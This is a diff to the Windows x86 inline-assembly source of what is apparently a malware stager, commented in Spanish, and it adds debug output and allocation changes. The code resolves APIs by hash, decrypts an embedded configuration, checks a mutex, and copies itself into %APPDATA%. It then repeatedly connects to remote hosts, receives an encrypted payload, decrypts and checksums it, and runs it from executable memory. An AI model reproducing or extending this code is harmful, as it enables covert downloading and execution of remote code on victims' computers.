@@ -13,7 +13,14 @@
 #pragma warning(disable:4799)
 
 #include <Windows.h>
+#include <stdio.h>
 #include "macros.h"
+
+#ifndef DEBUG
+#pragma comment(linker, "/NODEFAULTLIB")
+#else
+#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
+#endif
 
 void LoadFunctions(DWORD numHashes);
 
@@ -54,6 +61,7 @@ find_delta:
         #else //SC_NULL
         sub  edi, find_delta
         #endif //SC_NULL
+        DEBUG_MSG(sDELTA, (edi))
 #endif //SC_DELTA
 
         //Saltamos los hashes y funciones.
@@ -71,11 +79,12 @@ find_delta:
         *###############################################################################*/
 #pragma region hashes
 kernel32_symbol_hashes:
-        #define kernel32_count  13
+        #define kernel32_count  14
         API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
+        API_DEFINE(LocalAlloc, ('L') ('o') ('c') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
         API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
@@ -142,20 +151,27 @@ copy_done:
 load_next_target:
         mov  edi, [ebp+_pHOST]          //ESI = &HOSTn
         xor  eax, eax                   //EAX = 0
-        push 0x7F                       //v
-        pop  ecx                        //> ECX = 0x7F
-        repne scasb                     // Buscamos el final de la cadena
+        mov  ecx, -1                    //v
+        repne scasb                     //> Buscamos el final de la cadena
         mov  esi, edi                   //ESI = EDI
         lodsw                           //EAX = AX = PORT(n+1); ESI = &HOST(n+1)
-        shl  eax, 16                    //v
-        mov  al, AF_INET                //v
-        mov  [ebp+_PORT], eax           //> Formateamos el puerto y guardamos
-        mov  [ebp+_pHOST], esi          //
+#ifdef DEBUG
+        bswap eax
+        shr   eax, 16
+        DEBUG_MSG(sTARGET, (eax)(esi))
+        shl   eax, 16
+        bswap eax
+#endif
+        shl  eax, 16                    //
         test eax, eax                   //Comprobamos si es el último target
+        mov  al, AF_INET                //> Formateamos el puerto
+        mov  [ebp+_PORT], eax           //Guardamos puerto
+        mov  [ebp+_pHOST], esi          //Guardamos host
         jnz  get_out                    //Si no es el último devolvemos
         mov  ecx, [ebp+_TARGETS]        //v
         dec  ecx                        //>ECX-- para forzar a leer el primer target
         mov  [ebp+_pHOST], ecx          //> De ser el último apuntamos al inicio y devolvemos 0 en EAX
+        xor  eax, eax
 get_out:
         ret
 
@@ -177,12 +193,10 @@ conti:
 #endif //ERR_CHECK
 
 CreateBuff:
-        cdq                             //EDX = 0
-        push PAGE_EXECUTE_READWRITE     //v
-        pushc(MEM_COMMIT)               //v
-        push eax                        //v
-        push edx                        //v
-        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        pushc(1024)
+        push LPTR                       //v
+        call [ebp+_LocalAlloc]          //>VirtualAlloc(LPTR, SIZE)
+        DEBUG_MSG(sBUFFER, (eax))
 #ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
@@ -270,7 +284,7 @@ appdata_found:
 
         //ESI = &APPDATA
         mov  [ebp+_APPDATA], esi        //Almacenamos el puntero a APPDATA (UNICODE)
-
+        DEBUG_MSG(sAPPDATA, (esi))
         pop  esi                        //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -289,34 +303,41 @@ find_kernel32_finished:
 
         sub  ebp, STACK_OFFSET          //Apuntamos al inicio de Stack
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
+        DEBUG_MSG(sCK32, (kernel32_count))
+        DEBUG_MSG(sADDR, (eax))
         push kernel32_count             //v Número de hashes de kernel32
         call edi                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+STACK_OFFSET]//EBX = &LoadLibraryA
+        DEBUG_MSG(sOK, (NULL))
 
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
+        DEBUG_MSG(sCW32, (ws2_32_count))
         push esp                        //v
         call ebx                        //>LoadLibraryA("ws2_32");
+        DEBUG_MSG(sADDR, (eax))
         pop  edx                        //v
         pop  edx                        //>Restauramos la pila sacando la cadena ANSI
-
+        
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
         push ws2_32_count               //v Número de hashes de ws2_32
         call edi                        //>LoadFunctions(ws2_32_count);
-
+        DEBUG_MSG(sOK, (NULL))
         //Obtenemos el BaseAddress de advapi32
         cdq                             //EDX = 0
         push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
+        DEBUG_MSG(sCA32, (advapi32_count))
         push esp                        //v
         call ebx                        //>LoadLibraryA("advapi32");
+        DEBUG_MSG(sADDR, (eax))
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
 
         push advapi32_count             //v Número de hashes de advapi32
         call edi                        //>LoadFunctions(advapi32_count);
-
+        DEBUG_MSG(sOK, (NULL))
         add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
 #ifdef SC_DELTA
         pop  edi                        //Recuperamos el Delta
@@ -335,9 +356,7 @@ find_kernel32_finished:
         ** Descifrado y almacenado de la configuración:
         **   - Se descifra la configuración usando un packet XOR
         *###############################################################################*/
-        push CONFIG_SIZE                //v
-        pop  eax                        //>EAX = CONFIG_SIZE
-        call CreateBuff                 //>CreateBuff(CONFIG_SIZE);
+        call CreateBuff                 //>CreateBuff();
 
         mov  edx, eax                   //EDX = &Buffer
         xor  edi, edi                   //EDI = 0
@@ -366,6 +385,7 @@ xornext:
         /*###############################################################################
         **                          Comprobación del Mutex
         *###############################################################################*/
+        DEBUG_MSG(sMTX, ([ebp+_pMUTEX]))
         cdq                             //EDX = 0
         push [ebp+_pMUTEX]              //v
         push edx                        //v
@@ -381,6 +401,7 @@ xornext:
 #else //ERR_CHECK
         test eax, eax
         jz  nomtx
+        DEBUG_MSG(sERR, (NULL))
         push ERR_MTX
         call [ebp+_ExitProcess]
 nomtx:
@@ -400,15 +421,14 @@ nomtx:
         mov  edi, [ebp+_CommandLine]    //EDI = &CommandLine
         push edi                        //Guardamos &CommandLine para luego
         mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
+        cdq                             //EDX = 0
         //Comprobamos si estamos en %APPDATA%
 next_char:
         cmpsw                           //Comprobamos el caracter y pasamos al siguiente
         je   next_char                  //Si coincide probamos con el siguiente
-        cmp  [esi-2], bh                //Si no coincide miramos si es el ultimo char de APPDATA
+        cmp  BYTE PTR[esi-2], dl        //Si no coincide miramos si es el ultimo char de APPDATA
         je   do_not_copy                //Si es el \0 la ruta coincide y por lo tanto no nos copiamos
 
-        pushc(256)                      //v
-        pop  eax                        //>EAX = 512
         call CreateBuff                 //Creamos Buffer para las rutas
 
         mov  edi, eax                   //EDI = EAX
@@ -476,16 +496,32 @@ do_not_copy://(Somos la copia)
         push edi                        //v
         call [ebp+_DeleteFileW]         //>DeleteFileW(&file_to_delete);
 #endif //MELT
-        mov  esi, [ebp+_CommandLine]
-        pushc(256)
-        pop  eax
+        mov  esi, [ebp+_APPDATA]
         call CreateBuff
         mov  edi, eax
-        mov  [ebp+_DAT_NFO], edi       //Almacenamos la ruta del .dat que contiene las cosas offline
-        mov  dl, '"'                    //v
-        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla
-        //EDI apunta ahora al final de nuestra ruta.
-        mov  DWORD PTR[edi-4], 'tad.'     //Cambiamos la extensión a .dat
+        mov  [ebp+_DAT_NFO], edi        //Almacenamos la ruta del .dat que contiene las cosas offline
+        cdq                             //v
+        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar \0
+        mov  al, '\\'
+        stosb
+        //EDI = %APPDATA%
+        mov  edx, edi
+        mov  edi, [ebp+_CommandLine]
+save:   mov  ebx, edi
+again:  xor  eax, eax
+        scasw
+        je  found
+        cmp WORD PTR[edi-2], '\\'
+        jne again
+        jmp save
+found:
+        mov  esi, ebx
+        mov  edi, edx
+        mov  dl, '"'
+        call copy_uni_to_ascii_filter
+        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la extensión a .dat
+
+        DEBUG_MSG(sOFFLINE, (edi))
 
         cdq                             //EDX = 0
         push edx                        //v
@@ -501,7 +537,12 @@ do_not_copy://(Somos la copia)
 #define BUFF_SIZE 0x5000
 _cont:  xor  eax, eax                   //EAX = 0
         mov  ah, 0x50                   //EAX = BUFF_SIZE
-        call CreateBuff                 //CreateBuff(BUFF_SIZE)
+        cdq                             //EDX= 0
+        push PAGE_EXECUTE_READWRITE     //v
+        push MEM_COMMIT | MEM_RESERVE   //v
+        push eax                        //v
+        push edx                        //v
+        call [ebp+_VirtualAlloc]        //> VirtualAlloc(0, BUFF_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
@@ -540,6 +581,8 @@ newSocket:
         call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
+        DEBUG_MSG(sNEWSOCKT, (eax))
+
         jmp  connect_loop
 sleep_and_loop:
         call load_next_target           //> Cargamos el primer target
@@ -560,8 +603,8 @@ sleep_and_loop:
         push edx                        //v
         lea  edx, [ebp+_buffLen]        //v
         push edx                        //> &buff_len
-        xor  eax, eax                   //EAX = 0
-        mov  ah, 0x50                   //EAX = BUFF_SIZE
+        xor  eax, eax                   //v
+        mov  ah, 0x50                   //> EAX = BUFF_SIZE
         push eax                        //v
         push [ebp+_pBuff]               //v
         push [ebp+_DAT_NFO]             //v
@@ -578,6 +621,7 @@ do_the_loop:
 #endif //SC_NULL
         call [ebp+_Sleep]               //Sleep(0x3F8);
 connect_loop:
+        DEBUG_MSG(sCON, ([ebp+_pHOST]))
         //Obtenemos la dirección válida
         push [ebp+_pHOST]               //v
         call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
@@ -603,6 +647,7 @@ connect_loop:
         test eax, eax                   //v
         jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
 connected:
+        DEBUG_MSG(sOK, (NULL))
         /*###############################################################################
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
@@ -619,14 +664,18 @@ connected:
 recibir:
         cdq                             //EDX = 0
         push edx                        //v
-        pushc(BUFF_SIZE)                //v
+        xor  eax, eax                   //v
+        mov  ah, 0x50                   //> EAX = BUFF_SIZE
+        push eax                        //v
         push [ebp+_pBuff]               //v
         push [ebp+_hSocket]             //v
         call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
+
         mov  [ebp+_buffLen], eax        //buffLen = EAX
         cmp  eax, 0x7F                  //> Suficientes Bytes para no generar problemas
         jg   init_decrypt               //>EAX>7F? (Todo correcto? Procedemos a descifrar)
 KillSocket:
+        DEBUG_MSG(sRESET, (NULL))
         push [ebp+_hSocket]             //v
         call [ebp+_closesocket]         //>closesocket(hSocket);
         jmp  newSocket                  //Creamos un nuevo socket
@@ -639,6 +688,8 @@ KillSocket:
         *###############################################################################*/
 
 init_decrypt:
+        DEBUG_MSG(sRECV, (eax))
+        DEBUG_MSG(sICRYPT, (NULL))
         //Adquirimos el handle para trabajar con el CSP deseado.
         cdq                             //EDX = 0
 #ifdef SC_NULL
@@ -694,6 +745,8 @@ init_decrypt:
         push [ebp+_hKey]                //v
         call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, True, 0, pBuff, &buffLen);
 
+        DEBUG_MSG(sECRYPT, (NULL))
+
         pop  edx                        //Descartamos la variable temporal
         pop  ecx                        //Recuperamos SizeOfPayload+4
         test eax, eax                   //v
@@ -709,6 +762,9 @@ init_decrypt:
 
         sub  ecx, 4                     //ECX = SizePayload
         mov  ebx, [esi]                 //EBX = CheckSum
+
+        DEBUG_MSG(sHASH, (ebx)(ecx))
+
         add  esi, 4                     //ESI+= 4 (saltamos checksum)
         cdq                             //hash = 0
 FNV1a:
@@ -720,12 +776,15 @@ FNV1a:
         cmp  edx, ebx
         jne  KillSocket                 //>(EDX==checksum?)
 
+        DEBUG_MSG(sOK, (NULL))
+
         push [ebp+_hKey]                //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
         push [ebp+_LoadLibraryA]        //v
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x14                  // Saltamos hasta el loader
+        DEBUG_MSG(sEJEC, (eax))
         call eax                        //>loader(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
 
         //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
